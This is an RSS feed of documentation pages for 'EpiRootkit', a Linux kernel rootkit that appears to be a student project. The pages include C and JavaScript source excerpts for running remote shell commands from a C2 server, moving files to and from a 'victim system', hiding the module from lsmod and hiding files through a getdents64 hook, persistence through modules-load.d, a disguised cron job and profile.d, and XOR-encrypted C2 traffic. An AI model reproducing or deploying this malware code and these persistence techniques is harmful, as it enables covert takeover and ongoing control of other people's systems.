<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 31 May 2025 18:51:21 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong> via network&lt;/li>
&lt;li>&lt;strong>Rootkit executes&lt;/strong> using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
&lt;li>&lt;strong>Captures output&lt;/strong> by redirecting to temporary file&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong> with exit code and output&lt;/li>
&lt;/ol>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="command-handler">Command Handler &lt;a href="#command-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7d71c89" class="language-c ">
 &lt;code>static int handle_exec(const char *data)
{
 char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
 char *envp[] = { 
 &amp;#34;HOME=/&amp;#34;, 
 &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
 NULL 
 };
 
 // Generate unique temporary filename
 snprintf(temp_filename, sizeof(temp_filename), 
 &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
 
 // Build command with output redirection
 snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
 &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
 
 // Execute and capture output
 ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
 return send_result(formatted_result);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="output-capture">Output Capture &lt;a href="#output-capture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Redirection&lt;/strong>: &lt;code>command &amp;gt; /tmp/epirootkit_out_X 2&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;li>&lt;strong>File reading&lt;/strong>: Uses &lt;code>kernel_read()&lt;/code> to get output&lt;/li>
&lt;li>&lt;strong>Dynamic allocation&lt;/strong>: &lt;code>vmalloc()&lt;/code> for large outputs (up to 64KB)&lt;/li>
&lt;li>&lt;strong>Cleanup&lt;/strong>: Automatic temporary file removal&lt;/li>
&lt;/ul>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui-terminal">WebUI Terminal &lt;a href="#webui-terminal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Interactive terminal interface with:&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
&lt;h2 id="upload-files">Upload Files &lt;a href="#upload-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Upload files from C2 server to victim system.&lt;/p>
&lt;h3 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="c1385ed" class="language-bash ">
 &lt;code># Upload to specific path
upload Client-1 ./config.txt /etc/myapp/config.txt

# Upload to current directory 
upload Client-1 ./script.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="4ca9c69" class="language-c ">
 &lt;code>static int handle_upload(const char *data)
{
 char *filename, *file_content, *separator;
 struct file *file;
 loff_t pos = 0;
 
 // Parse filename:content format
 separator = strchr(data, &amp;#39;:&amp;#39;);
 *separator = &amp;#39;\0&amp;#39;;
 filename = data;
 file_content = separator &amp;#43; 1;
 
 // Create and write file
 file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 kernel_write(file, file_content, content_length, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_success(&amp;#34;File uploaded successfully&amp;#34;);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="download-files">Download Files &lt;a href="#download-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Download files from victim system to C2 server.&lt;/p></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/05-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module and files from system detection using kernel hooking techniques.&lt;/p>
&lt;h2 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7503503" class="language-c ">
 &lt;code>int hide_module(void)
{
 if (stealth_state.module_hidden) return 0;

 stealth_state.prev_module_entry = THIS_MODULE-&amp;gt;list.prev;
 list_del(&amp;amp;THIS_MODULE-&amp;gt;list);
 stealth_state.module_hidden = true;
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Technical Details:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Uses &lt;code>list_del()&lt;/code> to remove from kernel module list&lt;/li>
&lt;li>Stores previous entry pointer for restoration&lt;/li>
&lt;li>Thread-safe with mutex protection&lt;/li>
&lt;li>Reversible operation&lt;/li>
&lt;/ul>
&lt;h2 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide files with specific prefixes from directory listings by hooking the &lt;code>getdents64&lt;/code> syscall.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
&lt;h2 id="three-mechanisms">Three Mechanisms &lt;a href="#three-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-modules-loadd">1. modules-load.d &lt;a href="#1-modules-loadd" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;br>
&lt;strong>Content&lt;/strong>: &lt;code>epirootkit address=X.X.X.X port=YYYY&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: systemd reads config and loads module automatically on boot&lt;/p>
&lt;h3 id="2-cron-jobs">2. Cron Jobs &lt;a href="#2-cron-jobs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/cron.d/jules_est_bo_update&lt;/code>&lt;br>
&lt;strong>Schedule&lt;/strong>: Every 5 minutes check and load if not present&lt;br>
&lt;strong>Stealth&lt;/strong>: Disguised as system update task with stealth naming&lt;/p>
&lt;h3 id="3-shell-profiles">3. Shell Profiles &lt;a href="#3-shell-profiles" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/profile.d/jules_est_bo_env.sh&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: Executes when root user logs in&lt;br>
&lt;strong>Check&lt;/strong>: Loads module if not already present&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h1 id="dns-resolution">DNS Resolution &lt;a href="#dns-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.&lt;/p>
&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The DNS resolver:&lt;/p>
&lt;ul>
&lt;li>Resolves domain names to IP addresses in kernel space&lt;/li>
&lt;li>Uses UDP DNS queries to 8.8.8.8&lt;/li>
&lt;li>Automatically falls back to direct IP if address is already an IP&lt;/li>
&lt;li>Supports A record queries for IPv4 addresses&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="files">Files &lt;a href="#files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;code>rootkit/network/dns_resolver.c&lt;/code> - DNS client implementation&lt;/li>
&lt;li>&lt;code>rootkit/network/dns_resolver.h&lt;/code> - API header&lt;/li>
&lt;/ul>
&lt;h3 id="key-function">Key Function &lt;a href="#key-function" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b3cb8d7" class="language-c ">
 &lt;code>int kernel_dns_resolve(const char *hostname, u32 *ip_addr);&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Parameters:&lt;/strong>&lt;/p></description></item><item><title>XOR Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h1 id="xor-encryption">XOR Encryption &lt;a href="#xor-encryption" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>EpiRootkit uses XOR encryption for secure C2 communication with a bulletproof, dependency-free implementation.&lt;/p>
&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The XOR encryption system provides:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Simple Implementation&lt;/strong>: No complex crypto API dependencies&lt;/li>
&lt;li>&lt;strong>Bulletproof Reliability&lt;/strong>: Cannot fail due to timing or key derivation issues&lt;/li>
&lt;li>&lt;strong>Perfect Synchronization&lt;/strong>: Server and kernel use identical keys&lt;/li>
&lt;li>&lt;strong>High Performance&lt;/strong>: Minimal computational overhead&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="server-side-attacking_programsrcutilsencryptionjs">Server Side (&lt;code>attacking_program/src/utils/encryption.js&lt;/code>) &lt;a href="#server-side-attacking_programsrcutilsencryptionjs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="9d4c973" class="language-javascript ">
 &lt;code>// 32-byte hardcoded XOR key
const XOR_KEY = Buffer.from(&amp;#39;0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&amp;#39;, &amp;#39;hex&amp;#39;);

function xorCrypt(data) {
 const input = Buffer.isBuffer(data) ? data : Buffer.from(data, &amp;#39;utf8&amp;#39;);
 const result = Buffer.alloc(input.length);
 
 for (let i = 0; i &amp;lt; input.length; i&amp;#43;&amp;#43;) {
 result[i] = input[i] ^ XOR_KEY[i % XOR_KEY.length];
 }
 
 return result;
}

const encryption = {
 encrypt(text) { return xorCrypt(text); },
 decrypt(data) { return xorCrypt(data).toString(&amp;#39;utf8&amp;#39;); }
};&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="kernel-side-rootkitsecuritycryptoc">Kernel Side (&lt;code>rootkit/security/crypto.c&lt;/code>) &lt;a href="#kernel-side-rootkitsecuritycryptoc" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f22c02c" class="language-c ">
 &lt;code>// Matching XOR key (32 bytes)
static const u8 XOR_KEY[] = {
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
};

static void xor_crypt(const u8 *input, u8 *output, size_t length)
{
 size_t i;
 
 for (i = 0; i &amp;lt; length; i&amp;#43;&amp;#43;) {
 output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE];
 }
}

int encrypt_message(const char *plaintext, char **ciphertext, size_t *outlen);
int decrypt_message(const char *ciphertext, size_t cipherlen, char **plaintext);&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="key-features">Key Features &lt;a href="#key-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-hardcoded-key-synchronization">1. Hardcoded Key Synchronization &lt;a href="#1-hardcoded-key-synchronization" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Both server and kernel use the &lt;strong>exact same 32-byte key&lt;/strong>:&lt;/p></description></item></channel></rss>